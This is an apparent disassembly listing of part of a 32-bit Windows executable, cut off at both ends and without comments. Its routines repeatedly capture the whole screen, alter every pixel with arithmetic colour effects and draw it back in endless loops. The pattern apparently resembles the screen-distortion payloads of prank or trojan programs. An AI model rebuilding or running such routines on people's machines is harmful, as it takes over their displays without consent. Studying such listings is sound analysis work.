  402602:	89 45 90             	mov    %eax,-0x70(%ebp)
  402605:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402608:	89 45 94             	mov    %eax,-0x6c(%ebp)
  40260b:	66 c7 45 98 01 00    	movw   $0x1,-0x68(%ebp)
  402611:	66 c7 45 9a 20 00    	movw   $0x20,-0x66(%ebp)
  402617:	c7 45 9c 00 00 00 00 	movl   $0x0,-0x64(%ebp)
  40261e:	c7 45 88 00 00 00 00 	movl   $0x0,-0x78(%ebp)
  402625:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40262c:	00 
  40262d:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402634:	00 
  402635:	8d 45 88             	lea    -0x78(%ebp),%eax
  402638:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40263c:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402643:	00 
  402644:	8d 45 8c             	lea    -0x74(%ebp),%eax
  402647:	89 44 24 04          	mov    %eax,0x4(%esp)
  40264b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40264e:	89 04 24             	mov    %eax,(%esp)
  402651:	a1 e4 a1 40 00       	mov    0x40a1e4,%eax
  402656:	ff d0                	call   *%eax
  402658:	83 ec 18             	sub    $0x18,%esp
  40265b:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40265e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402661:	89 44 24 04          	mov    %eax,0x4(%esp)
  402665:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402668:	89 04 24             	mov    %eax,(%esp)
  40266b:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  402670:	ff d0                	call   *%eax
  402672:	83 ec 08             	sub    $0x8,%esp
  402675:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40267c:	d9 05 50 81 40 00    	flds   0x408150
  402682:	d9 5d c4             	fstps  -0x3c(%ebp)
  402685:	d9 05 54 81 40 00    	flds   0x408154
  40268b:	d9 5d c0             	fstps  -0x40(%ebp)
  40268e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402695:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  40269a:	ff d0                	call   *%eax
  40269c:	83 ec 04             	sub    $0x4,%esp
  40269f:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4026a2:	c7 44 24 28 20 00 cc 	movl   $0xcc0020,0x28(%esp)
  4026a9:	00 
  4026aa:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4026ad:	89 44 24 24          	mov    %eax,0x24(%esp)
  4026b1:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4026b4:	89 44 24 20          	mov    %eax,0x20(%esp)
  4026b8:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4026bf:	00 
  4026c0:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4026c7:	00 
  4026c8:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4026cb:	89 44 24 14          	mov    %eax,0x14(%esp)
  4026cf:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4026d2:	89 44 24 10          	mov    %eax,0x10(%esp)
  4026d6:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4026d9:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4026dd:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4026e4:	00 
  4026e5:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4026ec:	00 
  4026ed:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4026f0:	89 04 24             	mov    %eax,(%esp)
  4026f3:	a1 04 a2 40 00       	mov    0x40a204,%eax
  4026f8:	ff d0                	call   *%eax
  4026fa:	83 ec 2c             	sub    $0x2c,%esp
  4026fd:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  402704:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402707:	3b 45 d0             	cmp    -0x30(%ebp),%eax
  40270a:	0f 8d 01 02 00 00    	jge    0x402911
  402710:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  402717:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40271a:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  40271d:	0f 8d e5 01 00 00    	jge    0x402908
  402723:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402726:	0f af 45 d0          	imul   -0x30(%ebp),%eax
  40272a:	89 c2                	mov    %eax,%edx
  40272c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40272f:	01 d0                	add    %edx,%eax
  402731:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402734:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402737:	83 f0 04             	xor    $0x4,%eax
  40273a:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  402740:	db 85 60 ff ff ff    	fildl  -0xa0(%ebp)
  402746:	dd 9d 60 ff ff ff    	fstpl  -0xa0(%ebp)
  40274c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40274f:	c1 e0 02             	shl    $0x2,%eax
  402752:	89 85 58 ff ff ff    	mov    %eax,-0xa8(%ebp)
  402758:	db 85 58 ff ff ff    	fildl  -0xa8(%ebp)
  40275e:	dd 9d 58 ff ff ff    	fstpl  -0xa8(%ebp)
  402764:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402767:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40276a:	01 c2                	add    %eax,%edx
  40276c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40276f:	23 45 dc             	and    -0x24(%ebp),%eax
  402772:	09 d0                	or     %edx,%eax
  402774:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  40277a:	db 85 54 ff ff ff    	fildl  -0xac(%ebp)
  402780:	dd 1c 24             	fstpl  (%esp)
  402783:	e8 78 44 00 00       	call   0x406c00
  402788:	dc 8d 58 ff ff ff    	fmull  -0xa8(%ebp)
  40278e:	dc 85 60 ff ff ff    	faddl  -0xa0(%ebp)
  402794:	dd 9d 60 ff ff ff    	fstpl  -0xa0(%ebp)
  40279a:	f2 0f 2c 85 60 ff ff 	cvttsd2si -0xa0(%ebp),%eax
  4027a1:	ff 
  4027a2:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4027a5:	8b 45 88             	mov    -0x78(%ebp),%eax
  4027a8:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4027ab:	c1 e2 02             	shl    $0x2,%edx
  4027ae:	01 d0                	add    %edx,%eax
  4027b0:	8b 00                	mov    (%eax),%eax
  4027b2:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  4027b8:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  4027be:	8b 95 78 ff ff ff    	mov    -0x88(%ebp),%edx
  4027c4:	89 54 24 04          	mov    %edx,0x4(%esp)
  4027c8:	89 04 24             	mov    %eax,(%esp)
  4027cb:	e8 80 ef ff ff       	call   0x401750
  4027d0:	8b 85 68 ff ff ff    	mov    -0x98(%ebp),%eax
  4027d6:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  4027dc:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  4027e2:	89 45 80             	mov    %eax,-0x80(%ebp)
  4027e5:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  4027eb:	89 45 84             	mov    %eax,-0x7c(%ebp)
  4027ee:	db 45 b8             	fildl  -0x48(%ebp)
  4027f1:	d8 75 c4             	fdivs  -0x3c(%ebp)
  4027f4:	db 45 dc             	fildl  -0x24(%ebp)
  4027f7:	db 45 cc             	fildl  -0x34(%ebp)
  4027fa:	de f9                	fdivrp %st,%st(1)
  4027fc:	d8 4d c0             	fmuls  -0x40(%ebp)
  4027ff:	de c1                	faddp  %st,%st(1)
  402801:	d9 e8                	fld1
  402803:	dd 5c 24 08          	fstpl  0x8(%esp)
  402807:	dd 1c 24             	fstpl  (%esp)
  40280a:	e8 01 45 00 00       	call   0x406d10
  40280f:	d9 9d 60 ff ff ff    	fstps  -0xa0(%ebp)
  402815:	d9 85 60 ff ff ff    	flds   -0xa0(%ebp)
  40281b:	d9 9d 7c ff ff ff    	fstps  -0x84(%ebp)
  402821:	d9 45 80             	flds   -0x80(%ebp)
  402824:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402827:	ba 89 88 88 88       	mov    $0x88888889,%edx
  40282c:	89 c8                	mov    %ecx,%eax
  40282e:	f7 ea                	imul   %edx
  402830:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  402833:	c1 f8 04             	sar    $0x4,%eax
  402836:	89 c2                	mov    %eax,%edx
  402838:	89 c8                	mov    %ecx,%eax
  40283a:	c1 f8 1f             	sar    $0x1f,%eax
  40283d:	29 c2                	sub    %eax,%edx
  40283f:	89 d0                	mov    %edx,%eax
  402841:	6b c0 1e             	imul   $0x1e,%eax,%eax
  402844:	29 c1                	sub    %eax,%ecx
  402846:	89 c8                	mov    %ecx,%eax
  402848:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  40284e:	db 85 60 ff ff ff    	fildl  -0xa0(%ebp)
  402854:	d9 05 58 81 40 00    	flds   0x408158
  40285a:	de f9                	fdivrp %st,%st(1)
  40285c:	de c1                	faddp  %st,%st(1)
  40285e:	d9 e8                	fld1
  402860:	dd 5c 24 08          	fstpl  0x8(%esp)
  402864:	dd 1c 24             	fstpl  (%esp)
  402867:	e8 a4 44 00 00       	call   0x406d10
  40286c:	d9 9d 60 ff ff ff    	fstps  -0xa0(%ebp)
  402872:	d9 85 60 ff ff ff    	flds   -0xa0(%ebp)
  402878:	d9 5d 80             	fstps  -0x80(%ebp)
  40287b:	d9 45 84             	flds   -0x7c(%ebp)
  40287e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402881:	ba 67 66 66 66       	mov    $0x66666667,%edx
  402886:	89 c8                	mov    %ecx,%eax
  402888:	f7 ea                	imul   %edx
  40288a:	c1 fa 03             	sar    $0x3,%edx
  40288d:	89 c8                	mov    %ecx,%eax
  40288f:	c1 f8 1f             	sar    $0x1f,%eax
  402892:	29 c2                	sub    %eax,%edx
  402894:	89 d0                	mov    %edx,%eax
  402896:	c1 e0 02             	shl    $0x2,%eax
  402899:	01 d0                	add    %edx,%eax
  40289b:	c1 e0 02             	shl    $0x2,%eax
  40289e:	29 c1                	sub    %eax,%ecx
  4028a0:	89 ca                	mov    %ecx,%edx
  4028a2:	89 95 60 ff ff ff    	mov    %edx,-0xa0(%ebp)
  4028a8:	db 85 60 ff ff ff    	fildl  -0xa0(%ebp)
  4028ae:	d9 05 5c 81 40 00    	flds   0x40815c
  4028b4:	de f9                	fdivrp %st,%st(1)
  4028b6:	de c1                	faddp  %st,%st(1)
  4028b8:	d9 e8                	fld1
  4028ba:	dd 5c 24 08          	fstpl  0x8(%esp)
  4028be:	dd 1c 24             	fstpl  (%esp)
  4028c1:	e8 4a 44 00 00       	call   0x406d10
  4028c6:	d9 9d 60 ff ff ff    	fstps  -0xa0(%ebp)
  4028cc:	d9 85 60 ff ff ff    	flds   -0xa0(%ebp)
  4028d2:	d9 5d 84             	fstps  -0x7c(%ebp)
  4028d5:	8b 45 88             	mov    -0x78(%ebp),%eax
  4028d8:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4028db:	c1 e2 02             	shl    $0x2,%edx
  4028de:	8d 1c 10             	lea    (%eax,%edx,1),%ebx
  4028e1:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  4028e7:	89 04 24             	mov    %eax,(%esp)
  4028ea:	8b 45 80             	mov    -0x80(%ebp),%eax
  4028ed:	89 44 24 04          	mov    %eax,0x4(%esp)
  4028f1:	8b 45 84             	mov    -0x7c(%ebp),%eax
  4028f4:	89 44 24 08          	mov    %eax,0x8(%esp)
  4028f8:	e8 b6 f0 ff ff       	call   0x4019b3
  4028fd:	89 03                	mov    %eax,(%ebx)
  4028ff:	83 45 dc 01          	addl   $0x1,-0x24(%ebp)
  402903:	e9 0f fe ff ff       	jmp    0x402717
  402908:	83 45 e0 01          	addl   $0x1,-0x20(%ebp)
  40290c:	e9 f3 fd ff ff       	jmp    0x402704
  402911:	83 45 e4 01          	addl   $0x1,-0x1c(%ebp)
  402915:	c7 44 24 28 20 00 cc 	movl   $0xcc0020,0x28(%esp)
  40291c:	00 
  40291d:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402920:	89 44 24 24          	mov    %eax,0x24(%esp)
  402924:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402927:	89 44 24 20          	mov    %eax,0x20(%esp)
  40292b:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402932:	00 
  402933:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  40293a:	00 
  40293b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40293e:	89 44 24 14          	mov    %eax,0x14(%esp)
  402942:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402945:	89 44 24 10          	mov    %eax,0x10(%esp)
  402949:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40294c:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402950:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402957:	00 
  402958:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40295f:	00 
  402960:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402963:	89 04 24             	mov    %eax,(%esp)
  402966:	a1 04 a2 40 00       	mov    0x40a204,%eax
  40296b:	ff d0                	call   *%eax
  40296d:	83 ec 2c             	sub    $0x2c,%esp
  402970:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402973:	89 44 24 04          	mov    %eax,0x4(%esp)
  402977:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40297e:	a1 04 a3 40 00       	mov    0x40a304,%eax
  402983:	ff d0                	call   *%eax
  402985:	83 ec 08             	sub    $0x8,%esp
  402988:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40298b:	89 04 24             	mov    %eax,(%esp)
  40298e:	a1 ec a1 40 00       	mov    0x40a1ec,%eax
  402993:	ff d0                	call   *%eax
  402995:	83 ec 04             	sub    $0x4,%esp
  402998:	e9 f1 fc ff ff       	jmp    0x40268e
  40299d:	55                   	push   %ebp
  40299e:	89 e5                	mov    %esp,%ebp
  4029a0:	57                   	push   %edi
  4029a1:	56                   	push   %esi
  4029a2:	53                   	push   %ebx
  4029a3:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  4029a9:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4029b0:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  4029b5:	ff d0                	call   *%eax
  4029b7:	83 ec 04             	sub    $0x4,%esp
  4029ba:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4029bd:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4029c0:	89 04 24             	mov    %eax,(%esp)
  4029c3:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  4029c8:	ff d0                	call   *%eax
  4029ca:	83 ec 04             	sub    $0x4,%esp
  4029cd:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4029d0:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4029d7:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  4029dc:	ff d0                	call   *%eax
  4029de:	83 ec 04             	sub    $0x4,%esp
  4029e1:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4029e4:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4029eb:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  4029f0:	ff d0                	call   *%eax
  4029f2:	83 ec 04             	sub    $0x4,%esp
  4029f5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4029f8:	8d 55 9c             	lea    -0x64(%ebp),%edx
  4029fb:	b8 00 00 00 00       	mov    $0x0,%eax
  402a00:	b9 0b 00 00 00       	mov    $0xb,%ecx
  402a05:	89 d7                	mov    %edx,%edi
  402a07:	f3 ab                	rep stos %eax,%es:(%edi)
  402a09:	c7 45 98 00 00 00 00 	movl   $0x0,-0x68(%ebp)
  402a10:	c7 45 9c 2c 00 00 00 	movl   $0x2c,-0x64(%ebp)
  402a17:	66 c7 45 aa 20 00    	movw   $0x20,-0x56(%ebp)
  402a1d:	66 c7 45 a8 01 00    	movw   $0x1,-0x58(%ebp)
  402a23:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402a26:	89 45 a0             	mov    %eax,-0x60(%ebp)
  402a29:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402a2c:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  402a2f:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  402a36:	00 
  402a37:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  402a3e:	00 
  402a3f:	8d 45 98             	lea    -0x68(%ebp),%eax
  402a42:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402a46:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402a4d:	00 
  402a4e:	8d 45 9c             	lea    -0x64(%ebp),%eax
  402a51:	89 44 24 04          	mov    %eax,0x4(%esp)
  402a55:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402a58:	89 04 24             	mov    %eax,(%esp)
  402a5b:	a1 e4 a1 40 00       	mov    0x40a1e4,%eax
  402a60:	ff d0                	call   *%eax
  402a62:	83 ec 18             	sub    $0x18,%esp
  402a65:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402a68:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402a6b:	89 44 24 04          	mov    %eax,0x4(%esp)
  402a6f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402a72:	89 04 24             	mov    %eax,(%esp)
  402a75:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  402a7a:	ff d0                	call   *%eax
  402a7c:	83 ec 08             	sub    $0x8,%esp
  402a7f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402a86:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  402a8b:	ff d0                	call   *%eax
  402a8d:	83 ec 04             	sub    $0x4,%esp
  402a90:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402a93:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  402a9a:	00 
  402a9b:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402aa2:	00 
  402aa3:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402aaa:	00 
  402aab:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402aae:	89 44 24 14          	mov    %eax,0x14(%esp)
  402ab2:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402ab5:	89 44 24 10          	mov    %eax,0x10(%esp)
  402ab9:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402abc:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402ac0:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402ac7:	00 
  402ac8:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402acf:	00 
  402ad0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402ad3:	89 04 24             	mov    %eax,(%esp)
  402ad6:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  402adb:	ff d0                	call   *%eax
  402add:	83 ec 24             	sub    $0x24,%esp
  402ae0:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  402ae7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402aea:	0f af 45 d4          	imul   -0x2c(%ebp),%eax
  402aee:	39 45 e4             	cmp    %eax,-0x1c(%ebp)
  402af1:	0f 8d a4 00 00 00    	jge    0x402b9b
  402af7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402afa:	99                   	cltd
  402afb:	f7 7d d8             	idivl  -0x28(%ebp)
  402afe:	89 55 cc             	mov    %edx,-0x34(%ebp)
  402b01:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402b04:	99                   	cltd
  402b05:	f7 7d d8             	idivl  -0x28(%ebp)
  402b08:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402b0b:	8b 45 98             	mov    -0x68(%ebp),%eax
  402b0e:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402b11:	c1 e2 02             	shl    $0x2,%edx
  402b14:	01 d0                	add    %edx,%eax
  402b16:	0f b6 10             	movzbl (%eax),%edx
  402b19:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402b1c:	89 c1                	mov    %eax,%ecx
  402b1e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402b21:	89 ce                	mov    %ecx,%esi
  402b23:	21 c6                	and    %eax,%esi
  402b25:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402b28:	8b 5d cc             	mov    -0x34(%ebp),%ebx
  402b2b:	89 c1                	mov    %eax,%ecx
  402b2d:	d3 fb                	sar    %cl,%ebx
  402b2f:	89 d8                	mov    %ebx,%eax
  402b31:	09 c6                	or     %eax,%esi
  402b33:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402b36:	8b 5d cc             	mov    -0x34(%ebp),%ebx
  402b39:	89 c1                	mov    %eax,%ecx
  402b3b:	d3 e3                	shl    %cl,%ebx
  402b3d:	89 d8                	mov    %ebx,%eax
  402b3f:	09 f0                	or     %esi,%eax
  402b41:	89 c3                	mov    %eax,%ebx
  402b43:	8b 45 98             	mov    -0x68(%ebp),%eax
  402b46:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402b49:	c1 e1 02             	shl    $0x2,%ecx
  402b4c:	01 c8                	add    %ecx,%eax
  402b4e:	01 da                	add    %ebx,%edx
  402b50:	88 10                	mov    %dl,(%eax)
  402b52:	8b 45 98             	mov    -0x68(%ebp),%eax
  402b55:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402b58:	c1 e2 02             	shl    $0x2,%edx
  402b5b:	01 d0                	add    %edx,%eax
  402b5d:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  402b61:	8b 45 98             	mov    -0x68(%ebp),%eax
  402b64:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402b67:	c1 e1 02             	shl    $0x2,%ecx
  402b6a:	01 c8                	add    %ecx,%eax
  402b6c:	83 c2 28             	add    $0x28,%edx
  402b6f:	88 50 01             	mov    %dl,0x1(%eax)
  402b72:	8b 45 98             	mov    -0x68(%ebp),%eax
  402b75:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402b78:	c1 e2 02             	shl    $0x2,%edx
  402b7b:	01 d0                	add    %edx,%eax
  402b7d:	0f b6 50 02          	movzbl 0x2(%eax),%edx
  402b81:	8b 45 98             	mov    -0x68(%ebp),%eax
  402b84:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402b87:	c1 e1 02             	shl    $0x2,%ecx
  402b8a:	01 c8                	add    %ecx,%eax
  402b8c:	83 c2 50             	add    $0x50,%edx
  402b8f:	88 50 02             	mov    %dl,0x2(%eax)
  402b92:	83 45 e4 01          	addl   $0x1,-0x1c(%ebp)
  402b96:	e9 4c ff ff ff       	jmp    0x402ae7
  402b9b:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  402ba2:	00 
  402ba3:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402baa:	00 
  402bab:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402bb2:	00 
  402bb3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402bb6:	89 44 24 14          	mov    %eax,0x14(%esp)
  402bba:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402bbd:	89 44 24 10          	mov    %eax,0x10(%esp)
  402bc1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402bc4:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402bc8:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402bcf:	00 
  402bd0:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402bd7:	00 
  402bd8:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402bdb:	89 04 24             	mov    %eax,(%esp)
  402bde:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  402be3:	ff d0                	call   *%eax
  402be5:	83 ec 24             	sub    $0x24,%esp
  402be8:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402beb:	89 44 24 04          	mov    %eax,0x4(%esp)
  402bef:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402bf6:	a1 04 a3 40 00       	mov    0x40a304,%eax
  402bfb:	ff d0                	call   *%eax
  402bfd:	83 ec 08             	sub    $0x8,%esp
  402c00:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402c03:	89 04 24             	mov    %eax,(%esp)
  402c06:	a1 ec a1 40 00       	mov    0x40a1ec,%eax
  402c0b:	ff d0                	call   *%eax
  402c0d:	83 ec 04             	sub    $0x4,%esp
  402c10:	e9 6a fe ff ff       	jmp    0x402a7f
  402c15:	55                   	push   %ebp
  402c16:	89 e5                	mov    %esp,%ebp
  402c18:	53                   	push   %ebx
  402c19:	83 ec 54             	sub    $0x54,%esp
  402c1c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402c23:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  402c28:	ff d0                	call   *%eax
  402c2a:	83 ec 04             	sub    $0x4,%esp
  402c2d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402c30:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  402c37:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  402c3c:	ff d0                	call   *%eax
  402c3e:	83 ec 04             	sub    $0x4,%esp
  402c41:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402c44:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402c47:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  402c4b:	89 c2                	mov    %eax,%edx
  402c4d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402c50:	01 d0                	add    %edx,%eax
  402c52:	c1 e0 02             	shl    $0x2,%eax
  402c55:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  402c5c:	00 
  402c5d:	c7 44 24 08 00 30 00 	movl   $0x3000,0x8(%esp)
  402c64:	00 
  402c65:	89 44 24 04          	mov    %eax,0x4(%esp)
  402c69:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402c70:	a1 64 a2 40 00       	mov    0x40a264,%eax
  402c75:	ff d0                	call   *%eax
  402c77:	83 ec 10             	sub    $0x10,%esp
  402c7a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402c7d:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  402c84:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402c8b:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  402c90:	ff d0                	call   *%eax
  402c92:	83 ec 04             	sub    $0x4,%esp
  402c95:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402c98:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402c9b:	89 04 24             	mov    %eax,(%esp)
  402c9e:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  402ca3:	ff d0                	call   *%eax
  402ca5:	83 ec 04             	sub    $0x4,%esp
  402ca8:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402cab:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402cae:	89 44 24 10          	mov    %eax,0x10(%esp)
  402cb2:	c7 44 24 0c 20 00 00 	movl   $0x20,0xc(%esp)
  402cb9:	00 
  402cba:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  402cc1:	00 
  402cc2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402cc5:	89 44 24 04          	mov    %eax,0x4(%esp)
  402cc9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402ccc:	89 04 24             	mov    %eax,(%esp)
  402ccf:	a1 dc a1 40 00       	mov    0x40a1dc,%eax
  402cd4:	ff d0                	call   *%eax
  402cd6:	83 ec 14             	sub    $0x14,%esp
  402cd9:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402cdc:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402cdf:	89 44 24 04          	mov    %eax,0x4(%esp)
  402ce3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402ce6:	89 04 24             	mov    %eax,(%esp)
  402ce9:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  402cee:	ff d0                	call   *%eax
  402cf0:	83 ec 08             	sub    $0x8,%esp
  402cf3:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  402cfa:	00 
  402cfb:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402d02:	00 
  402d03:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402d0a:	00 
  402d0b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402d0e:	89 44 24 14          	mov    %eax,0x14(%esp)
  402d12:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402d15:	89 44 24 10          	mov    %eax,0x10(%esp)
  402d19:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402d1c:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402d20:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402d27:	00 
  402d28:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402d2f:	00 
  402d30:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402d33:	89 04 24             	mov    %eax,(%esp)
  402d36:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
